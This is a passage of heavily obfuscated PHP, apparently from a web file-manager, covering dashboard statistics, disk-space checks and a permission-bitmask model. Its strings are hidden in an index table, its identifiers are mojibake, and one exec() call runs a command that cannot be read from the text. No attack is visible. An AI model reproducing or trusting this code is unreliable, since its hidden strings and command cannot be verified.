array_to_keyvalue($fÆÜ‹çÎ–ì, $Eñ°Øëƒò·[220]); foreach ($eÍ‡™Õèä as $A˜”ã‘ºÔ) { if (isset($cÅù©×ŸÂ”[$A˜”ã‘ºÔ])) { $Aî± Ä”–¥ = $cÅù©×ŸÂ”[$A˜”ã‘ºÔ]; } else { $Aî± Ä”–¥ = end($fÆÜ‹çÎ–ì); $Aî± Ä”–¥[$Eñ°Øëƒò·[220]] = $A˜”ã‘ºÔ; if ($A¡Óùñßä‡ == $Eñ°Øëƒò·[560]) { $Aî± Ä”–¥[$Eñ°Øëƒò·[1583]] = $Aî± Ä”–¥[$Eñ°Øëƒò·[1584]] = 0; } } $C°–í—ƒæ[] = $Aî± Ä”–¥; } $fÆÜ‹çÎ–ì = $C°–í—ƒæ; } $A­©ê‚ğÇõ = array($Eñ°Øëƒò·[560] => array($Eñ°Øëƒò·[723] => LNG($Eñ°Øëƒò·[1599]), $Eñ°Øëƒò·[1583] => LNG($Eñ°Øëƒò·[1600]), $Eñ°Øëƒò·[1584] => LNG($Eñ°Øëƒò·[1601])), $Eñ°Øëƒò·[1585] => array($Eñ°Øëƒò·[721] => LNG($Eñ°Øëƒò·[1602]), $Eñ°Øëƒò·[1587] => LNG($Eñ°Øëƒò·[1603]), $Eñ°Øëƒò·[1588] => LNG($Eñ°Øëƒò·[1604]), $Eñ°Øëƒò·[1589] => LNG($Eñ°Øëƒò·[1605]))); $b‰ø‰Ô—¸Š = array($Eñ°Øëƒò·[560] => $Eñ°Øëƒò·[1606], $Eñ°Øëƒò·[1585] => $Eñ°Øëƒò·[77]); goto a¡ÏÌ Ú˜†; a¡ÏÌ Ú˜†: if (empty($fÆÜ‹çÎ–ì)) { $A˜”ã‘ºÔ = date($Eñ°Øëƒò·[1590], strtotime($Eñ°Øëƒò·[1591])); $BÅÀ‹ùƒ½í = array($Eñ°Øëƒò·[220] => $A˜”ã‘ºÔ); foreach ($A­©ê‚ğÇõ[$A¡Óùñßä‡] as $E­Éä¦‹¨í => $E±†ç±¡š‹) { $BÅÀ‹ùƒ½í[$E­Éä¦‹¨í] = 0; } $fÆÜ‹çÎ–ì[] = $BÅÀ‹ùƒ½í; } $bÒÊª‡š–İ = array(); foreach ($fÆÜ‹çÎ–ì as $E±†ç±¡š‹) { if ($A¡Óùñßä‡ == $Eñ°Øëƒò·[1585] && $E±†ç±¡š‹[$Eñ°Øëƒò·[1587]] > $E±†ç±¡š‹[$Eñ°Øëƒò·[721]]) { $E±†ç±¡š‹[$Eñ°Øëƒò·[1587]] = $E±†ç±¡š‹[$Eñ°Øëƒò·[721]]; } foreach ($A­©ê‚ğÇõ[$A¡Óùñßä‡] as $E­Éä¦‹¨í => $AíØòÒ»¯’) { $Aî± Ä”–¥ = array($Eñ°Øëƒò·[220] => $E±†ç±¡š‹[$Eñ°Øëƒò·[220]], $Eñ°Øëƒò·[1403] => $AíØòÒ»¯’); $Aî± Ä”–¥[$b‰ø‰Ô—¸Š[$A¡Óùñßä‡]] = isset($E±†ç±¡š‹[$E­Éä¦‹¨í]) ? $E±†ç±¡š‹[$E­Éä¦‹¨í] : 0; $bÒÊª‡š–İ[] = $Aî± Ä”–¥; } } goto eİ‰Á‡îÂÛ; Bì¹ÁÓÎ‹Î: } public function validDate($B÷“ï×©ßˆ, $FèÕöÅÍ†£) { goto Cƒœ¦„„Ôù; CÖ‹ƒ˜“ì®: return $BÎÔÓÊ—Â¿; goto d˜ŸÊ•áÃÛ; Cƒœ¦„„Ôù: $bÕ¢Ë…Õ =& $_SERVER[¢ÌÛ]; $B°·³ËÓ¨Ì = date($bÕ¢Ë…Õ[1590], strtotime($bÕ¢Ë…Õ[1591])); $BÎÔÓÊ—Â¿ = array($B°·³ËÓ¨Ì); goto FØ‡Ñ‘­Š±; FØ‡Ñ‘­Š±: switch ($B÷“ï×©ßˆ) { case $bÕ¢Ë…Õ[1479]: $B«Æ®¦¼Ö¨ = mktime(0, 0, 0, date($bÕ¢Ë…Õ[1607]), date($bÕ¢Ë…Õ[1224]) - date($bÕ¢Ë…Õ[1286]) + 7 - 7, date($bÕ¢Ë…Õ[1608])); $Bîˆãªº‰Æ = 0; do { $eä§Ø²Àó¯ = date($bÕ¢Ë…Õ[1590], $B«Æ®¦¼Ö¨ - 3600 * 24 * 7 * $Bîˆãªº‰Æ); $BÎÔÓÊ—Â¿[] = $eä§Ø²Àó¯; $Bîˆãªº‰Æ++; } while ($FèÕöÅÍ†£ < $eä§Ø²Àó¯); break; case $bÕ¢Ë…Õ[1477]: $Bîˆãªº‰Æ = 1; do { $ešø¹ìµÑÌ = date($bÕ¢Ë…Õ[1609], strtotime("\55\40{$Bîˆãªº‰Æ}\40\155\157\x6e\164\150\x73")); $BÎÔÓÊ—Â¿[] = $ešø¹ìµÑÌ; $Bîˆãªº‰Æ++; } while ($FèÕöÅÍ†£ < $ešø¹ìµÑÌ); break; case $bÕ¢Ë…Õ[1610]: $fö”ÈÎæ‘ó = (int) date($bÕ¢Ë…Õ[1608], strtotime($FèÕöÅÍ†£)); $a ™§º×‹µ = (int) date($bÕ¢Ë…Õ[1608]); if ($fö”ÈÎæ‘ó >= $a ™§º×‹µ) { break; } for ($fö”ÈÎæ‘ó; $fö”ÈÎæ‘ó < $a ™§º×‹µ; $fö”ÈÎæ‘ó++) { $BÎÔÓÊ—Â¿[] = $fö”ÈÎæ‘ó . $bÕ¢Ë…Õ[1611]; } break; default: break; } if ($FèÕöÅÍ†£ > end($BÎÔÓÊ—Â¿)) { array_pop($BÎÔÓÊ—Â¿); } sort($BÎÔÓÊ—Â¿); goto CÖ‹ƒ˜“ì®; d˜ŸÊ•áÃÛ: } public function listTable($dàº¥Ë©ƒ) { $Föò¥ÌœÅ = ucfirst($dàº¥Ë©ƒ); return Model($Föò¥ÌœÅ)->listData(); } public function option($B“¢ˆšÈô‡) { $bªó¶Ú× = $_SERVER[¢ÌÛ][1612] . ucfirst($B“¢ˆšÈô‡); return $this->{$bªó¶Ú×}(); } private function optionUser() { goto dÀ‚½Â¦«­; dÀ‚½Â¦«­: $eˆº³–Œ£Ô =& $_SERVER[¢ÌÛ]; $b˜¤­à›“ = Model($eˆº³–Œ£Ô[504])->count($eˆº³–Œ£Ô[1498]); $F¡“¨¨‚ãÊ = Model($eˆº³–Œ£Ô[504])->where($eˆº³–Œ£Ô[1613])->count($eˆº³–Œ£Ô[1498]); goto bØÍŒŠà–˜; bÜ¦Ğè‚ª: $bÒè¢ŒÖ»À = Model($eˆº³–Œ£Ô[504])->where($C©âµó²Õó)->count($eˆº³–Œ£Ô[1498]); return array($eˆº³–Œ£Ô[718] => (int) $b˜¤­à›“, $eˆº³–Œ£Ô[1616] => (int) ($b˜¤­à›“ - $F¡“¨¨‚ãÊ), $eˆº³–Œ£Ô[1617] => (int) $F¡“¨¨‚ãÊ, $eˆº³–Œ£Ô[1618] => (int) $bÒè¢ŒÖ»À, $eˆº³–Œ£Ô[1619] => $AÎ ’®Åá ); goto B¶ÍèëÄìø; bØÍŒŠà–˜: $c²±ÔÉØàã = strtotime($eˆº³–Œ£Ô[1614]); $C©âµó²Õó = array($eˆº³–Œ£Ô[1615] => array($eˆº³–Œ£Ô[948], $c²±ÔÉØàã)); $AÎ ’®Åá  = (int) Model($eˆº³–Œ£Ô[504])->where($C©âµó²Õó)->count($eˆº³–Œ£Ô[1498]); goto bØø…Ê³; bØø…Ê³: if (!$AÎ ’®Åá ) { $AÎ ’®Åá  = 1; } $c²±ÔÉØàã = strtotime(date($eˆº³–Œ£Ô[1594])); $C©âµó²Õó = array($eˆº³–Œ£Ô[1615] => array($eˆº³–Œ£Ô[948], $c²±ÔÉØàã)); goto bÜ¦Ğè‚ª; B¶ÍèëÄìø: } private function optionFile() { goto Fµ”½›í„­; Aš‰­¯¥Ù: $AÜŸ¾ø˜‚ˆ = Model($F÷…±¶‰¬[774])->where($A¥¸œº¬Ş)->sum($F÷…±¶‰¬[77]); $EŞÜ„¥øœÓ = Model($F÷…±¶‰¬[774])->where($A¥¸œº¬Ş)->count($F÷…±¶‰¬[396]); return array($F÷…±¶‰¬[721] => $dÒŞõò¿îğ, $F÷…±¶‰¬[1587] => $D”†åÎÂ°, $F÷…±¶‰¬[1620] => $dÒŞõò¿îğ - $D”†åÎÂ°, $F÷…±¶‰¬[1621] => (int) $AÜŸ¾ø˜‚ˆ, $F÷…±¶‰¬[723] => (int) $bÒ‚¥ŒÉ¤, $F÷…±¶‰¬[1622] => (int) $EŞÜ„¥øœÓ); goto CîµÊ”Ş¬¶; Fµ”½›í„­: $F÷…±¶‰¬ =& $_SERVER[¢ÌÛ]; $béÌˆ†Ü™» = $this->sourceSize(); $dÒŞõò¿îğ = $béÌˆ†Ü™»[$F÷…±¶‰¬[77]]; goto ağ¾éøÁàØ; ağ¾éøÁàØ: $D”†åÎÂ° = $béÌˆ†Ü™»[$F÷…±¶‰¬[1587]]; $bÒ‚¥ŒÉ¤ = Model($F÷…±¶‰¬[774])->where(array($F÷…±¶‰¬[397] => 0))->count($F÷…±¶‰¬[396]); $A¥¸œº¬Ş = array($F÷…±¶‰¬[397] => 0, $F÷…±¶‰¬[192] => array($F÷…±¶‰¬[948], strtotime(date($F÷…±¶‰¬[1594])))); goto Aš‰­¯¥Ù; CîµÊ”Ş¬¶: } private function optionAccess() { $Bê‚Âøç¥Ê =& $_SERVER[¢ÌÛ]; return array($Bê‚Âøç¥Ê[718] => $this->typeLogCnt(), $Bê‚Âøç¥Ê[106] => $this->typeLogCnt($Bê‚Âøç¥Ê[106]), $Bê‚Âøç¥Ê[430] => $this->typeLogCnt($Bê‚Âøç¥Ê[430]), $Bê‚Âøç¥Ê[1623] => $this->typeLogCnt($Bê‚Âøç¥Ê[1623]), $Bê‚Âøç¥Ê[1624] => $this->typeLogCnt($Bê‚Âøç¥Ê[1624]), $Bê‚Âøç¥Ê[560] => $this->typeLogCnt($Bê‚Âøç¥Ê[33], $Bê‚Âøç¥Ê[1598])); } private function typeLogCnt($eä†âŞ»Ã = '', $A‹±ŒøóÅ = "\151\144") { goto E–«ÜÌµÙ‘; D¼ÊôÎ‹¯Æ: $bŠã©æ©¶ = array($c›Âš±œÂÅ[192] => array($c›Âš±œÂÅ[948], $E›ª¼á‡Äá)); if ($eä†âŞ»Ã) { $bŠã©æ©¶[$c›Âš±œÂÅ[29]] = array($c›Âš±œÂÅ[7], $D…ÎÁêŒ¿ì[$eä†âŞ»Ã]); } $añƒÂêºõ§ = Model($c›Âš±œÂÅ[1597])->where($bŠã©æ©¶)->count($A‹±ŒøóÅ); goto eÄÖ¯ÈÀ…±; eÄÖ¯ÈÀ…±: return (int) $añƒÂêºõ§; goto e¼ÓÂ†ğ; E–«ÜÌµÙ‘: $c›Âš±œÂÅ =& $_SERVER[¢ÌÛ]; $D…ÎÁêŒ¿ì = array($c›Âš±œÂÅ[106] => array($c›Âš±œÂÅ[1625], $c›Âš±œÂÅ[1626]), $c›Âš±œÂÅ[430] => array($c›Âš±œÂÅ[1627], $c›Âš±œÂÅ[1628]), $c›Âš±œÂÅ[1623] => array($c›Âš±œÂÅ[1629], $c›Âš±œÂÅ[1630], $c›Âš±œÂÅ[1631]), $c›Âš±œÂÅ[1624] => array($c›Âš±œÂÅ[1632], $c›Âš±œÂÅ[1633]), $c›Âš±œÂÅ[1634] => array($c›Âš±œÂÅ[1635], $c›Âš±œÂÅ[1636], $c›Âš±œÂÅ[1637])); $E›ª¼á‡Äá = strtotime(date($c›Âš±œÂÅ[1594])); goto D¼ÊôÎ‹¯Æ; e¼ÓÂ†ğ: } private function optionServer() { goto e’±ŞÑ¾ÇŸ; a›ö˜Èóæ: $E¶÷°‹ÖƒÒ = array($AÌ‰¼íÃÄ[766] => $b•åÍ¼Š¥[$AÌ‰¼íÃÄ[385]]); $D¯¦±Îµ‡Ø = Model($AÌ‰¼íÃÄ[448])->where($E¶÷°‹ÖƒÒ)->sum($AÌ‰¼íÃÄ[77]); $a…ËæìˆÅ¸ = explode($AÌ‰¼íÃÄ[50], $_SERVER[$AÌ‰¼íÃÄ[141]]); goto fƒ¡É²÷ƒº; DŒ²ä†»¿ø: if ($A¬™ÈÊÅ¶  == $AÌ‰¼íÃÄ[746]) { $A©‚ãÆ¦ÔÚ = explode($AÌ‰¼íÃÄ[1138], $C Ê¨ŸËÀ[$AÌ‰¼íÃÄ[908]]); $A¬™ÈÊÅ¶  = $A©‚ãÆ¦ÔÚ[0]; } if ($A¬™ÈÊÅ¶  == $AÌ‰¼íÃÄ[749] || $A¬™ÈÊÅ¶  == $AÌ‰¼íÃÄ[750]) { $EÕÁ™ö‡àÙ = Model()->db()->query($AÌ‰¼íÃÄ[1638]); $BÒ…ÚÆŠ¾µ = $EÕÁ™ö‡àÙ[0] && isset($EÕÁ™ö‡àÙ[0][$AÌ‰¼íÃÄ[1402]]) ? $EÕÁ™ö‡àÙ[0][$AÌ‰¼íÃÄ[1402]] : 0; $A¬™ÈÊÅ¶  = $AÌ‰¼íÃÄ[1639] . ($BÒ…ÚÆŠ¾µ ? $AÌ‰¼íÃÄ[8] . $BÒ…ÚÆŠ¾µ : $AÌ‰¼íÃÄ[33]); } $D„‚³­„‚ = $GLOBALS[$AÌ‰¼íÃÄ[6]][$AÌ‰¼íÃÄ[345]][$AÌ‰¼íÃÄ[776]]; goto e´¶·Ãã¦ğ; e´¶·Ãã¦ğ: return array($AÌ‰¼íÃÄ[1640] => $e‹›ÄªÛÃí ? $e‹›ÄªÛÃí[$AÌ‰¼íÃÄ[1641]] : 0, $AÌ‰¼íÃÄ[1642] => $e‹›ÄªÛÃí ? $e‹›ÄªÛÃí[$AÌ‰¼íÃÄ[1643]] : 0, $AÌ‰¼íÃÄ[1644] => (int) $b•åÍ¼Š¥[$AÌ‰¼íÃÄ[1641]] * 1024 * 1024 * 1024, $AÌ‰¼íÃÄ[1645] => (int) $D¯¦±Îµ‡Ø, $AÌ‰¼íÃÄ[1646] => ucfirst($Aùˆó§Æ), $AÌ‰¼íÃÄ[1647] => $AÌ‰¼íÃÄ[1648] . PHP_VERSION, $AÌ‰¼íÃÄ[1649] => phpBuild64() ? 64 : 32, $AÌ‰¼íÃÄ[717] => str_replace($AÌ‰¼íÃÄ[1650], $AÌ‰¼íÃÄ[925], $A¬™ÈÊÅ¶ ), $AÌ‰¼íÃÄ[345] => ucfirst($D„‚³­„‚), $AÌ‰¼íÃÄ[28] => $_SERVER[$AÌ‰¼íÃÄ[1651]]); goto cíÙÕÁ‡Ì; fƒ¡É²÷ƒº: $Aùˆó§Æ = $a…ËæìˆÅ¸[0]; $C Ê¨ŸËÀ = $GLOBALS[$AÌ‰¼íÃÄ[6]][$AÌ‰¼íÃÄ[17]]; $A¬™ÈÊÅ¶  = $C Ê¨ŸËÀ[$AÌ‰¼íÃÄ[909]]; goto DŒ²ä†»¿ø; e’±ŞÑ¾ÇŸ: $AÌ‰¼íÃÄ =& $_SERVER[¢ÌÛ]; $e‹›ÄªÛÃí = $this->diskDriver(); $b•åÍ¼Š¥ = KodIO::defaultDriver(); goto a›ö˜Èóæ; cíÙÕÁ‡Ì: } private function diskDriver() { goto A„À·‘‚à; eµ˜´Ş¿²Ø: if ($Fóù¶Š‹ô) { $d„ù¢ëº¹¤ = $d§Á½¸Ã­–[1654]; if (function_exists($d§Á½¸Ã­–[1655])) { exec($d§Á½¸Ã­–[1656], $D¼ÇšŠÊĞ˜); $d„ù¢ëº¹¤ = $D¼ÇšŠÊĞ˜[1] . $d§Á½¸Ã­–[8]; } } if (!file_exists($d„ù¢ëº¹¤)) { return; } $eÃ•¤Ã‘š = @disk_total_space($d„ù¢ëº¹¤); goto b„Œò‹ÇÊİ; A„À·‘‚à: $d§Á½¸Ã­– =& $_SERVER[¢ÌÛ]; $d„ù¢ëº¹¤ = $d§Á½¸Ã­–[8]; $Fóù¶Š‹ô = $GLOBALS[$d§Á½¸Ã­–[6]][$d§Á½¸Ã­–[1652]] == $d§Á½¸Ã­–[1653]; goto eµ˜´Ş¿²Ø; b„Œò‹ÇÊİ: $A‰÷—ñÄ“ = $eÃ•¤Ã‘š - @disk_free_space($d„ù¢ëº¹¤); return array($d§Á½¸Ã­–[1641] => $eÃ•¤Ã‘š, $d§Á½¸Ã­–[1643] => $A‰÷—ñÄ“); goto CœªÉìù„›; CœªÉìù„›: } public function fileChart($f™î¨ª‘ëƒ) { goto Bâó¥õ“¥«; F¬Œì”ï´: $d×ŸÌ¡øÖ = $this->sourceSize(); $DØí‹œĞç© = array($a·´ø’‹ŠÊ[488] => 0, $a·´ø’‹ŠÊ[398] => 1); $AÏ”íææ¯ = Model($a·´ø’‹ŠÊ[774])->where($DØí‹œĞç©)->sum($a·´ø’‹ŠÊ[77]); goto F óö‹ÎîË; F óö‹ÎîË: $DØí‹œĞç©[$a·´ø’‹ŠÊ[398]] = 2; $c…†ê¹Ùù = Model($a·´ø’‹ŠÊ[774])->where($DØí‹œĞç©)->sum($a·´ø’‹ŠÊ[77]); return array($a·´ø’‹ŠÊ[721] => $d×ŸÌ¡øÖ[$a·´ø’‹ŠÊ[77]], $a·´ø’‹ŠÊ[1587] => $d×ŸÌ¡øÖ[$a·´ø’‹ŠÊ[1587]], $a·´ø’‹ŠÊ[1588] => (int) $AÏ”íææ¯, $a·´ø’‹ŠÊ[1589] => (int) $c…†ê¹Ùù); goto AîĞ¥¦áÃ; Bâó¥õ“¥«: $a·´ø’‹ŠÊ =& $_SERVER[¢ÌÛ]; if (isset($f™î¨ª‘ëƒ[$a·´ø’‹ŠÊ[1498]])) { return Model($a·´ø’‹ŠÊ[774])->userFileTypeProfile($f™î¨ª‘ëƒ[$a·´ø’‹ŠÊ[1498]]); } if (isset($f™î¨ª‘ëƒ[$a·´ø’‹ŠÊ[1657]])) { return Model($a·´ø’‹ŠÊ[774])->groupFileTypeProfile($f™î¨ª‘ëƒ[$a·´ø’‹ŠÊ[1657]]); } goto F¬Œì”ï´; AîĞ¥¦áÃ: } private function sourceSize() { $B„—•…µ´Ë =& $_SERVER[¢ÌÛ]; $EÛÊ¦õÓŒ¿ = Model($B„—•…µ´Ë[774])->where(array($B„—•…µ´Ë[397] => 0))->sum($B„—•…µ´Ë[77]); $C‚ËÀÆæ = Model($B„—•…µ´Ë[448])->sum($B„—•…µ´Ë[77]); if ($C‚ËÀÆæ > $EÛÊ¦õÓŒ¿) { $C‚ËÀÆæ = $EÛÊ¦õÓŒ¿; } return array($B„—•…µ´Ë[77] => (int) $EÛÊ¦õÓŒ¿, $B„—•…µ´Ë[1587] => (int) $C‚ËÀÆæ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $bÑØğ¥¬õ‹ =& $_SERVER[¢ÌÛ]; $Fãõİ»œ¢ø = array(array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1658]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1660], $bÑØğ¥¬õ‹[1661] => 1, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1664]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1665], $bÑØğ¥¬õ‹[1661] => 2, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1666]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1667], $bÑØğ¥¬õ‹[1661] => 3, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1668]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1669], $bÑØğ¥¬õ‹[1661] => 4, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => self::AUTH_SHOW | self::AUTH_VIEW), array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1670]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1671], $bÑØğ¥¬õ‹[1661] => 5, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1672]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1673], $bÑØğ¥¬õ‹[1661] => 6, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bÑØğ¥¬õ‹[413] => LNG($bÑØğ¥¬õ‹[1674]), $bÑØğ¥¬õ‹[1659] => $bÑØğ¥¬õ‹[1675], $bÑØğ¥¬õ‹[1661] => 7, $bÑØğ¥¬õ‹[1662] => 1, $bÑØğ¥¬õ‹[1663] => 0)); return $Fãõİ»œ¢ø; } public static function authCheck($bë×£¾²¼, $A ñ…ê¤) { $bë×£¾²¼ = intval($bë×£¾²¼); if (_get($GLOBALS, $_SERVER[¢ÌÛ][484])) { return !0; } if ($bë×£¾²¼ <= 0) { return !1; } if (($bë×£¾²¼ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($bë×£¾²¼ & $A ñ…ê¤); } public static function authCheckShow($Dò¬§İ×î) { return self::authCheck($Dò¬§İ×î, self::AUTH_SHOW); } public static function authCheckView($bŒ“…ÖÓ) { return self::authCheck($bŒ“…ÖÓ, self::AUTH_VIEW); } public static function authCheckDownload($A¦Îù½«àñ) { return self::authCheck($A¦Îù½«àñ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($c®Ÿù¬ˆ) { return self::authCheck($c®Ÿù¬ˆ, self::AUTH_UPLOAD); } public static function authCheckEdit($cä×ƒÆóÊê) { return self::authCheck($cä×ƒÆóÊê, self::AUTH_EDIT); } public static function authCheckRemove($e±Œª¦ƒèŒ) { return self::authCheck($e±Œª¦ƒèŒ, self::AUTH_REMOVE); } public static function authCheckShare($fÑ¯Ù×‚Õ) { return self::authCheck($fÑ¯Ù×‚Õ, self::AUTH_SHARE); } public static function authCheckComment($AĞğ±ƒÖ²ß) { return self::authCheck($AĞğ±ƒÖ²ß, self::AUTH_COMMENT); } public static function authCheckEvent($e„Ÿ÷Şçœ¸) { return self::authCheck($e„Ÿ÷Şçœ¸, self::AUTH_EVENT); } public static function authCheckRoot($dŸ¤ªÇàĞ‚) { return self::authCheck($dŸ¤ªÇàĞ‚, self::AUTH_ROOT); } public static function authCheckAction($eéõ¬Î¿‰¨, $e…¸˜Ë—¢À) { goto e˜Í‰¬Öµ­; CÑˆÓóªóß: $B´’–‰ïí = $C„òê˜›×ù[$e…¸˜Ë—¢À]; $eéõ¬Î¿‰¨ = intval($eéõ¬Î¿‰¨); if ($eéõ¬Î¿‰¨ <= 0) { return !1; } goto Dã£§ÜÙø; e˜Í‰¬Öµ­: $CöÄ¹¯Ô =& $_SERVER[¢ÌÛ]; $C„òê˜›×ù = array($CöÄ¹¯Ô[1676] => self::AUTH_VIEW, $CöÄ¹¯Ô[1070] => self::AUTH_DOWNLOAD, $CöÄ¹¯Ô[106] => self::AUTH_UPLOAD, $CöÄ¹¯Ô[1624] => self::AUTH_EDIT, $CöÄ¹¯Ô[1623] => self::AUTH_REMOVE, $CöÄ¹¯Ô[1634] => self::AUTH_SHARE, $CöÄ¹¯Ô[350] => self::AUTH_COMMENT, $CöÄ¹¯Ô[1487] => self::AUTH_EVENT, $CöÄ¹¯Ô[1677] => self::AUTH_ROOT); if (!isset($C„òê˜›×ù[$e…¸˜Ë—¢À])) { return; } goto CÑˆÓóªóß; Dã£§ÜÙø: if (($eéõ¬Î¿‰¨ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($eéõ¬Î¿‰¨ & $B´’–‰ïí); goto C¾á×Àä¾Ú; C¾á×Àä¾Ú: } public static function authDisable($EøÍ°×³¼¦, $cÍ¨‹Ü´Ê¡) { if (intval($EøÍ°×³¼¦) <= 0) { return 0; } return intval($EøÍ°×³¼¦) & ~$cÍ¨‹Ü´Ê¡; } public $optionType = "\123\171\x73\164\145\x6d\x2e\163\157\165\x72\143\x65\x41\x75\164\x68\x4c\x69\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\141\x75\x74\150", "\154\141\x62\145\154", "\144\x69\x73\x70\154\x61\x79", "\x73\x79\163\164\x65\x6d", "\x73\157\x72\164"); public function initData() { $AóÅ‰½ä½¶ = $this->authDefault(); foreach ($AóÅ‰½ä½¶ as $D¨õ—ºè) { $this->add($D¨õ—ºè); } } public function listData($C½íÙª¯à› = false, $eáö¯òå‘¶ = "\163\x6f\x72\164", $d×¬ê½Øˆƒ = false) { return parent::listData($C½íÙª¯à›, $eáö¯òå‘¶, $d×¬ê½Øˆƒ); } public function update($f”‰óÀÌÜ, $f–µì–³ª”) { $d‘¿ˆ‘×â =& $_SERVER[¢ÌÛ]; $dí•¯İ‡ = parent::listData($f”‰óÀÌÜ); $eøãì¡øí  = $this->findByName($f–µì–³ª”[$d‘¿ˆ‘×â[28]]); if (!$dí•¯İ‡ || $eøãì¡øí  && $eøãì¡øí [$d‘¿ˆ‘×â[385]] != $dí•¯İ‡[$d‘¿ˆ‘×â[385]]) { return !1; } $this->filterAuth($f–µì–³ª”[$d‘¿ˆ‘×â[403]]); return parent::update($f”‰óÀÌÜ, $f–µì–³ª”); } public function remove($c½ˆğóÈ•Ñ) { $F°ø™ïàÚƒ = parent::listData($c½ˆğóÈ•Ñ); if (!$F°ø™ïàÚƒ || $F°ø™ïàÚƒ[$_SERVER[¢ÌÛ][1142]]) { return !1; } return parent::remove($c½ˆğóÈ•Ñ); } public function add($cğªéÜ‹°º = array()) { goto c—©‚‚¾¨í; DŒÃÖŞà£†: return parent::insert($cğªéÜ‹°º); goto dÕ¼››çÖ; c—©‚‚¾¨í: $AÙœÁíÖ„  =& $_SERVER[¢ÌÛ]; if ($this->findByName($cğªéÜ‹°º[$AÙœÁíÖ„ [28]])) { return !1; } $bä…ª–Ç = array($AÙœÁíÖ„ [28] => $AÙœÁíÖ„ [33], $AÙœÁíÖ„ [403] => 1, $AÙœÁíÖ„ [1678] => $AÙœÁíÖ„ [1667], $AÙœÁíÖ„ [1679] => 1, $AÙœÁíÖ„ [1142] => 0, $AÙœÁíÖ„ [1680] => 0); goto C×‘ÙøÇ¦¯; C×‘ÙøÇ¦¯: $cğªéÜ‹°º = array_merge($bä…ª–Ç, $cğªéÜ‹°º); $cğªéÜ‹°º[$AÙœÁíÖ„ [1680]] = $this->getSort(); $this->filterAuth($cğªéÜ‹°º[$AÙœÁíÖ„ [403]]); goto DŒÃÖŞà£†; dÕ¼››çÖ: } private function getSort() { $BÇù°ÍŒ‚¬ =& $_SERVER[¢ÌÛ]; $DÆ´»İŒˆœ = parent::listData(); $eğë“®ô = array_to_keyvalue($DÆ´»İŒˆœ, $BÇù°ÍŒ‚¬[33], $BÇù°ÍŒ‚¬[1680]); return empty($eğë“®ô) ? 0 : max($eğë“®ô) + 1; } private function filterAuth(&$A¦¡ÏæÄÖ) { goto D½ÍÉ¢Ù†¦; D½ÍÉ¢Ù†¦: if (!$A¦¡ÏæÄÖ) { return; } $Có¢Øø¹öù = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EÚ»Ô¨½‰š = array(); goto D°âÖäÊÒ; D°âÖäÊÒ: foreach ($Có¢Øø¹öù as $E‹º¡«ºÄ) { if ($A¦¡ÏæÄÖ & $E‹º¡«ºÄ) { $EÚ»Ô¨½‰š[] = $E‹º¡«ºÄ; } } if (in_array(self::AUTH_ROOT, $EÚ»Ô¨½‰š)) { $A¦¡ÏæÄÖ = array_sum($Có¢Øø¹öù); return; } $d§èŸ¸ßŸ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto D‹¶„ÇìÕ; D‹¶„ÇìÕ: foreach 